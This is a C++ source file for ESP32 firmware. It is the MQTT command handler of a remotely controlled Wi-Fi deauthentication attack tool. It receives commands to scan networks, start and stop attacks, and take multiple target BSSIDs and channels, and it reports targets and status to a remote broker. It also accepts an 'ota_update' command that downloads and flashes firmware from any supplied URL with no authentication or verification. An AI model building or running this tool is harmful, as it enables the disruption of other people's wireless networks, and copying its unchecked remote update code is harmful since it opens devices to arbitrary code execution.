#include "mqtt_handler.h"
#include "attack_manager.h"
#include "deauth.h"
#include <HTTPClient.h>   // ✅ ADD
#include <Update.h>
#include "definitions.h"       // ✅ ADD


void MQTTHandler::begin() {
    Serial.println("📡 MQTT Handler initialized");
}

void MQTTHandler::callback(char* topic, byte* payload, unsigned int length, 
                           PubSubClient& mqtt, bool& attackTriggered,
                           bool& attackModeActive, bool& attackPaused,
                           std::vector<AttackTarget>& attackTargets,
                           std::vector<AttackTarget>& savedAttackTargets,
                           uint16_t& savedReason, unsigned long& checkInterval,
                           unsigned long& lastCheckTime, uint16_t& lastReason) {
    String msg = "";
    for (unsigned int i = 0; i < length; i++) msg += (char)payload[i];
    
    if (msg.length() == 0) return;
    
    Serial.printf("📩 MQTT [%s]: %s\n", topic, msg.c_str());
    
    bool isRetained = String(topic).indexOf("/retained") > 0;
    
    if (msg == "start_attack") {
        handleStartAttack(mqtt, attackTriggered);
    } 
    else if (msg == "stop_attack") {
        handleStopAttack(mqtt, attackTriggered, attackModeActive, attackPaused);
        if (isRetained) mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    }
    else if (msg == "status") {
    Serial.println("📊 Status requested - sending...");
    publishStatus(mqtt, attackModeActive ? "attacking" : "standby", 
                  attackModeActive ? "attacking" : "standby");
}
    else if (msg == "scan") {
        Serial.println("🔍 Scan requested - scanning...");
        std::vector<ScannedNetwork> scanResults;
        AttackManager::scanAndReport(scanResults);
        publishScanResults(mqtt, scanResults);
        if (isRetained) mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    }
    else if (msg.startsWith("multi_attack")) {
        handleMultiAttack(mqtt, msg, attackTargets, savedAttackTargets,
                         savedReason, lastCheckTime, attackModeActive,
                         attackTriggered, lastReason);
    }
    else if (msg.startsWith("set_interval:")) {
        handleSetInterval(msg, mqtt, checkInterval);
    }
    else if (msg == "restart") {
        handleRestart(mqtt);
    }
    // ✅ ADD THIS BLOCK:
    else if (msg.startsWith("ota_update:")) {
        String url = msg.substring(11);
        handleOTAUpdate(mqtt, url);
    }
    // ✅ END ADD
    else {
        Serial.println("❓ Unknown command: " + msg);
    }
}

void MQTTHandler::handleStartAttack(PubSubClient& mqtt, bool& attackTriggered) {
    attackTriggered = true;
    publishStatus(mqtt, "starting_attack", "attacking");  // ✅ Use publishStatus
    Serial.println("⚔️  ATTACK COMMAND RECEIVED!");
}

void MQTTHandler::handleStopAttack(PubSubClient& mqtt, bool& attackTriggered,
                                   bool& attackModeActive, bool& attackPaused) {
    attackTriggered = false;
    attackModeActive = false;
    attackPaused = false;
    stop_deauth();
    publishStatus(mqtt, "stopped", "standby");  // ✅ Use publishStatus
    Serial.println("🛑 STOP received. Staying connected.");
}
void MQTTHandler::handleMultiAttack(PubSubClient& mqtt, const String& msg,
                                    std::vector<AttackTarget>& attackTargets,
                                    std::vector<AttackTarget>& savedAttackTargets,
                                    uint16_t& savedReason, unsigned long& lastCheckTime,
                                    bool& attackModeActive, bool& attackTriggered,
                                    uint16_t& lastReason) {
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║   ⚔️  MULTI-TARGET ATTACK RECEIVED  ║");
    Serial.println("╚══════════════════════════════════════╝");
    
    // Parse payload
    String payload;
    if (msg.startsWith("multi_attack:")) payload = msg.substring(13);
    else if (msg.startsWith("multi_attack ")) payload = msg.substring(13);
    else { Serial.println("❌ Invalid format"); return; }
    
    int comma = payload.indexOf(',');
    if (comma < 0) { Serial.println("❌ No comma found"); return; }
    
    uint16_t reason = payload.substring(0, comma).toInt();
    String targetsStr = payload.substring(comma + 1);
    
    Serial.printf("   Reason: %d\n", reason);
    savedReason = reason;
    attackTargets.clear();
    
    // Parse targets
    if (targetsStr.indexOf('|') > 0) {
        int start = 0, end = targetsStr.indexOf('|');
        while (start < targetsStr.length()) {
            String target = (end > 0) ? targetsStr.substring(start, end) 
                                      : targetsStr.substring(start);
            parseTargetString(target, attackTargets);
            if (end > 0) { start = end + 1; end = targetsStr.indexOf('|', start); }
            else start = targetsStr.length();
        }
    } else {
        parseTargetString(targetsStr, attackTargets);
    }
    
    savedAttackTargets = attackTargets;
    Serial.printf("   Targets: %d\n", attackTargets.size());
    
  if (attackTargets.size() > 0) {
    // ✅ Build and send attack status DIRECTLY with target info
    DynamicJsonDocument doc(2048);
    doc["device"] = DEVICE_ID;
    doc["status"] = "attacking";
    doc["mode"] = "multi_target";
    doc["target_count"] = attackTargets.size();
    doc["reason"] = reason;
    doc["uptime"] = millis() / 1000;
    doc["rssi"] = WiFi.RSSI();
    doc["ip"] = WiFi.localIP().toString();
    
    JsonArray targets = doc.createNestedArray("targets");
    for (const auto& t : attackTargets) {
        JsonObject obj = targets.createNestedObject();
        obj["ssid"] = MQTTHandler::sanitizeSsid(t.ssid);
        char bssidStr[18];
        sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                t.bssid[0], t.bssid[1], t.bssid[2],
                t.bssid[3], t.bssid[4], t.bssid[5]);
        obj["bssid"] = bssidStr;
        obj["channel"] = t.channel;
    }
    
    String json;
    serializeJson(doc, json);
    
    Serial.printf("   📤 Sending attack status: %s\n", json.c_str());
    mqtt.publish(TOPIC_STATUS, json.c_str());
    
    // ✅ Flush MQTT - CRITICAL for delivery before disconnect
    for (int i = 0; i < 20; i++) {
        mqtt.loop();
        delay(50);
    }
    
    Serial.println("🔌 Disconnecting from MQTT and WiFi...");
    mqtt.disconnect();
    WiFi.disconnect(true);
    delay(100);
    
    AttackManager::startAttack(attackTargets, reason);
    attackModeActive = true;
    attackTriggered = true;
    lastReason = reason;
    lastCheckTime = millis();
}
 }

void MQTTHandler::handleRestart(PubSubClient& mqtt) {
    Serial.println("🔄 RESTART RECEIVED!");
    mqtt.publish(TOPIC_CMD_RETAINED, "", true);
    mqtt.publish(TOPIC_CMD, "", true);
    
    for (int i = 0; i < 5; i++) { mqtt.loop(); delay(100); }
    
    publishStatus(mqtt, "restarting");  // ✅ Use publishStatus
    mqtt.loop();
    delay(1000);
    ESP.restart();
}

void MQTTHandler::handleSetInterval(const String& msg, PubSubClient& mqtt,
                                    unsigned long& checkInterval) {
    String intervalStr = msg.substring(13);
    unsigned long newInterval = intervalStr.toInt();
    if (newInterval >= 30000 && newInterval <= 3600000) {
        checkInterval = newInterval;
        Serial.printf("⏰ Check interval: %lu seconds\n", newInterval / 1000);
        String response = "{\"status\":\"interval_updated\",\"interval\":" + 
                         String(newInterval) + "}";
        mqtt.publish(TOPIC_STATUS, response.c_str());
    }
}

void MQTTHandler::parseTargetString(const String& target, 
                                    std::vector<AttackTarget>& attackTargets) {
    int c1 = target.indexOf(',');
    int c2 = target.indexOf(',', c1 + 1);
    
    if (c1 <= 0) return;
    
    String bssidStr = target.substring(0, c1);
    int channel = (c2 > 0) ? target.substring(c1 + 1, c2).toInt() : target.substring(c1 + 1).toInt();
    String ssid = (c2 > 0) ? target.substring(c2 + 1) : "";
    
    AttackTarget at;
    at.ssid = ssid;
    at.channel = channel;
    
    int values[6];
    if (sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) at.bssid[i] = (uint8_t)values[i];
        attackTargets.push_back(at);
        Serial.printf("   🎯 %s | %s | Ch:%d\n", ssid.c_str(), bssidStr.c_str(), channel);
    }
}

void MQTTHandler::publishStatus(PubSubClient& mqtt, const char* status,
                                const char* mode, bool paused) {
    DynamicJsonDocument doc(8192);
    doc["device"] = DEVICE_ID;
    doc["status"] = status;
    if (strlen(mode) > 0) doc["mode"] = mode;
    if (paused) doc["paused"] = true;
    doc["uptime"] = millis() / 1000;
    doc["rssi"] = WiFi.RSSI();
    doc["ip"] = WiFi.localIP().toString();
    
    // Add attack details if attacking
    extern std::vector<TargetAP> multi_targets;
    extern int deauth_type;
    
    if (deauth_type == DEAUTH_TYPE_MULTI && multi_targets.size() > 0) {
        doc["attack_type"] = "multi_target";
        doc["target_count"] = multi_targets.size();
        
        JsonArray targets = doc.createNestedArray("targets");
        for (const auto& t : multi_targets) {
            JsonObject obj = targets.createNestedObject();
            obj["ssid"] = MQTTHandler::sanitizeSsid(t.ssid);
            
            char bssidStr[18];
            sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                    t.bssid[0], t.bssid[1], t.bssid[2],
                    t.bssid[3], t.bssid[4], t.bssid[5]);
            obj["bssid"] = bssidStr;
            obj["channel"] = t.channel;
        }
    }
    
    String json;
    serializeJson(doc, json);
    mqtt.publish(TOPIC_STATUS, json.c_str());
}

void MQTTHandler::publishScanResults(PubSubClient& mqtt,
                                     const std::vector<ScannedNetwork>& networks) {
    if (!mqtt.connected()) return;
    
    DynamicJsonDocument doc(8192);
    doc["device"] = DEVICE_ID;
    doc["type"] = "scan_results";
    doc["timestamp"] = millis();
    
    JsonArray arr = doc.createNestedArray("networks");
    for (const auto& net : networks) {
        JsonObject obj = arr.createNestedObject();
        obj["ssid"] = MQTTHandler::sanitizeSsid(net.ssid);
        obj["bssid"] = net.bssid;
        obj["channel"] = net.channel;
        obj["rssi"] = net.rssi;
        obj["distance"] = round(net.distance * 10) / 10.0;
        obj["is_target"] = net.is_target;
    }
    
    doc["total_networks"] = networks.size();
    
    String json;
    serializeJson(doc, json);
    mqtt.publish(TOPIC_SCAN, json.c_str());
    Serial.println("📤 Scan results sent");
}


void MQTTHandler::handleOTAUpdate(PubSubClient& mqtt, const String& url) {
    Serial.println("\n╔══════════════════════════════════════╗");
    Serial.println("║        📦 OTA UPDATE STARTED         ║");
    Serial.println("╚══════════════════════════════════════╝");
    Serial.printf("   URL: %s\n", url.c_str());
    
    mqtt.publish(TOPIC_STATUS, "{\"status\":\"ota_starting\"}");
    mqtt.loop();
    delay(500);
    mqtt.disconnect();
    delay(200);
    
    HTTPClient http;
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.begin(url);
    
    int httpCode = http.GET();
    Serial.printf("   HTTP code: %d\n", httpCode);
    
    if (httpCode == HTTP_CODE_OK) {
        int contentLength = http.getSize();
        Serial.printf("   Size: %d bytes\n", contentLength);
        
        if (contentLength > 0 && Update.begin(contentLength)) {
            WiFiClient* stream = http.getStreamPtr();
            size_t written = 0;
            int lastProgress = 0;
            
            while (written < contentLength && stream->connected()) {
                if (stream->available()) {
                    uint8_t buffer[128];
                    size_t len = stream->read(buffer, sizeof(buffer));
                    if (len > 0) {
                        Update.write(buffer, len);
                        written += len;
                        
                        int progress = (written * 100) / contentLength;
                        if (progress != lastProgress) {
                            Serial.printf("   Progress: %d%%\n", progress);
                            lastProgress = progress;
                        }
                    }
                }
                yield();
            }
            
            if (written == contentLength && Update.end() && Update.isFinished()) {
                Serial.println("   ✅ OTA SUCCESS! Restarting...");
                delay(3000);
                ESP.restart();
            } else {
                Serial.printf("   ❌ Flash error\n");
            }
        }
    } else {
        Serial.printf("   ❌ HTTP Error: %d\n", httpCode);
    }
    
    http.end();

}


String MQTTHandler::sanitizeSsid(const String& ssid) {
    String clean = ssid;
    for (int i = 0; i < clean.length(); i++) {
        char c = clean[i];
        if (c < 32 || c > 126) {
            clean[i] = '?';
        }
    }
    return clean;
}